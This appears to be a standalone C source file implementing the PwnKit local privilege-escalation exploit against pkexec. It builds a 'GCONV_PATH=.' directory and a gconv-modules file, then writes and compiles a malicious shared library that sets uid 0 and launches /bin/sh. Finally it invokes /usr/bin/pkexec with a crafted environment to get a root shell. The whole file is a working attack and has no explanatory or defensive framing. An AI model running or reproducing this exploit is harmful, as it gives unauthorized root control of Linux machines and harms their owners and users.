#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>



void compileExploit()
{
	FILE *fp;
	fp = fopen("pwnkit/pwnkit.c", "w");
	if (fp < 0) {
                perror("fopen");
		exit(0);
        }

	char *shell = 
	    "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "#include <unistd.h>\n"
            "void gconv() {}\n"
            "void gconv_init() {\n"
            "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
            "  static char *a_argv[] = { \"sh\", NULL };\n"
            "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
            "  execve(\"/bin/sh\", a_argv, a_envp);\n"
            "  exit(0);\n"
            "}\n";	

	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
}

int main(int argc, char *argv[]) {
	FILE *fp;
    	struct stat st;

	char * a_argv[]={ NULL };
    	char * a_envp[]={
        	"pwnkit", 
	    "PATH=GCONV_PATH=.", 
	    "CHARSET=PWNKIT", 
	    "SHELL=pwnkit", 
	    NULL
    	};

	if (stat("GCONV_PATH=.", &st) < 0) {
            if(mkdir("GCONV_PATH=.", 0777) < 0) {
                perror("mkdir");
		exit(0);
            }
        int fd = open("GCONV_PATH=./pwnkit", O_CREAT|O_RDWR, 0777);
            if (fd < 0) {
                perror("open");
		exit(0);
            }
            close(fd);
    	}
	
	if (stat("pwnkit", &st) < 0) {
            if(mkdir("pwnkit", 0777) < 0) {
                perror("mkdir");
		exit(0);
        }

        FILE *fp = fopen("pwnkit/gconv-modules", "wb");
        if(fp == NULL) {
            perror("fopen");
	    exit(0);
        }
        fprintf(fp, "module UTF-8// PWNKIT// pwnkit 2\n");
        fclose(fp);
    	}

	compileExploit();

	execve("/usr/bin/pkexec", a_argv, a_envp);
}
